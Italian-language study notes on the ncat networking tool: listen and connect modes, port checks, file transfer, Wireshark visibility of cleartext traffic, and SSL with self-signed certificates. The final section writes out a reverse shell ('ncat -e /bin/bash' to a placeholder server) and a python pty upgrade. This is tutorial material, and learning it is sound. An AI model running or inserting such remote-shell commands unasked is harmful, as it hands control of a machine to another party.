#CyberSecurity


# **Cos'è Ncat?**

>Ncat è un tool di networking pieno di feature che permette di leggere e scrivere data sulla rete dalla linea di comando.
>E' stato progettato per essere un tool back-end affidabile per creare connessioni ad altre applicazioni od utenti.

```Shell
#Installazione di ncat
sudo apt install ncat
```

- Fare check di porte aperte sulla rete
```Shell
ncat nome_pc port

#Esempio:
ncat server03 22

#Questo ci dirà che la porta è occupata da SSH, perchè solitamente ssh opera sulla porta 22

```

>Ncat può essere un 2 principali forme connect (client) o listen (server)

```Shell
#Avvia ncat in listening mode (porta di default 31337)
ncat -l numero_porta

#Flag utili:
-k # accetta più connessioni in listening mode
-v # verbosità, descrive quello che sta succedendo
#Da un'altra shell possiamo vedere chi è in ascolto con il comando
```

>Per vedere che servizi ci sono in ascolto sulla rete:
```Shell
sudo ss -lpnt
#-l = mostra solo i socket che sono in stato di ascolto
#-p = mostra il nome del programma e del suo PID
#-n = numeric, impedisce al comando di risolvere i nomi dei servizi
#-t = filtra i risultati per mostrare solo le connessioni che usano il protocollo TCP
```

>Per connettersi a quel server ncat in ascolto
```Shell
ncat IP_server Porta
```

>Possiamo anche passare dei file attraverso ncat
```Shell
#Il server quando avvia dice di poter ricevere un file, in questo esempio passeremo un .txt e il server lo salverà con il nome che gli specifichiamo

ncat -l > out.txt

#Il client mentre il server è in ascolto gli può passare il file facendo:

ncat server < nome_file.txt (txt, jpg, ecc)

#Si può anche direttamente mostrare il contenuto di testo al server

cat nome_file.txt | ncat IP_server Porta

```

## **Tutte queste comunicazioni però sono in chiaro!!!**
>Di conseguenza aprendo banalmente Wireshark e filtrando i pacchetti della rete sulla porta in cui stiamo lavorando qualcuno potrebbe vedere i contenuti di quello che stiamo inviando.
>Filtro =  tcp.port==numer_porta

- **Per renderlo criptato bisogna usare delle certificazioni (come ssl) per criptare i messaggi**
>In questo caso userà dei certificati ssl temporanei
```Shell
#Server
ncat -lkv --ssl

#Client
ncat IP_server PORTA --ssl
```

>Per usare dei certificati che rimangano dobbiamo prima generarli
```Shell
#Server
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

#req -x509 genera un certificato auto firmato
#-newkey rsa:2058 genera una chiave RSA a 2048bit
#-keyout key.pem salva la chiave nel file specificato
#-out cert.pem salva il cerificato in questo file
#-days 365 daà una scadenza di 365 giorni
#-nodes non protegge la chiave con una password
```

>Ora dopo che il server ha generato i certificati e le chiavi basterà fare:
```Shell
ncat -lkv IP_server PORTA --ssl --ssl-cert cert.pem --ssl-key key.pem

#Client
ncat IP_server PORTA --ssl
```

## **Passare una remote shell al server**

>RAW Shell senza nome$nomepc: 
```Shell
#Server 
ncat -lkv

#Client
ncat --exec (oppure -e) "/bin/bash" IP_server PORTA
#esegue la bash sul server
#la bash si ritrova in /bin/bash essendo comunque un programma
```

>Shell integrata (python3)
```Shell
#UNA VOLTA DENTRO IL SERVER CON UNA BASH RAW INSERITA FARE:
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## **DOVE IMPARARE ALTRO**

- **PAGINA MAN (OBVIOSLY)**
- **NEGLI /example FANNO VEDERE DEGLI ESEMPI PRATICI